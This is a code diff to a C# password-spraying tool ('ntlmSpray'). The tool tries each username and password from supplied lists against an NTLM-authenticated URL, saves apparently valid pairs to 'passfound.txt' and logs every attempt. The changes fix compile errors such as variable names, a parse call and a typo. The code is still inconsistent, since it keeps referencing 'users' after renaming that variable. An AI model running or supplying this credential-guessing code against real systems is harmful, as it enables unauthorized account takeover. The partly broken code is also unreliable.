@@ -18,12 +18,13 @@ namespace ntlmSpray
 			
 			string URL = args[0];
 			string domain = args[1];
-			string users = args[2];
+			string userList = args[2];
 			string passwordList = args[3];
+			int delay = 60;
 			
 			try
 			{
-				int delay = Int.Parse(args[4]);
+				delay = Int32.Parse(args[4]);
 				
 				if (delay < 60)
 				{
@@ -122,7 +123,7 @@ namespace ntlmSpray
 			Console.WriteLine("Performing spray against: " + URL);
 			Console.WriteLine("With domain as: " + domain);
 			Console.WriteLine("Numbers of Users: " + users.Length.ToString());
-			Console.WriteLine("Number of Passwors: " + passwors.Length.ToString());
+			Console.WriteLine("Number of Passwors: " + passwords.Length.ToString());
 			Console.WriteLine("Delay between Passwords (Mins): " + delay.ToString());
 			Console.WriteLine("Start Time: " + DateTime.Now);
 			
@@ -149,11 +150,11 @@ namespace ntlmSpray
 					
 					if(wRespCode != 500 && wRespCode != 401 && wRespCode != 404)
 					{
-						Console.WriteLine("\r\n" + user + " " + password + " " + wRespCode.ToString() + "\r\n\n");
+						Console.WriteLine("\r\n" + uname + " " + password + " " + wRespCode.ToString() + "\r\n\n");
 						using(System.IO.StreamWriter fout = 
 								new System.IO.StreamWriter("passfound.txt", true))
 						{
-							fout.WriteLine(user + " " + password + " " + wRespCode.ToString()); 
+							fout.WriteLine(uname + " " + password + " " + wRespCode.ToString()); 
 						}
 					}
 					else
@@ -161,8 +162,8 @@ namespace ntlmSpray
 						using(System.IO.StreamWriter fout = 
 							new System.IO.StreamWriter("spray_stats.txt", true))
 							{
-								fout.WriteLine(DateTime.Now + " " + user + " " + password + " " + wRespCode.ToString() + 
-									" " + responseTime.Seconds.ToString() + "." + ts.Milliseconds.ToString()); 
+								fout.WriteLine(DateTime.Now + " " + uname + " " + password + " " + wRespCode.ToString() + 
+									" " + responseTime.Seconds.ToString() + "." + responseTime.Milliseconds.ToString()); 
 							}
 					}
 				}
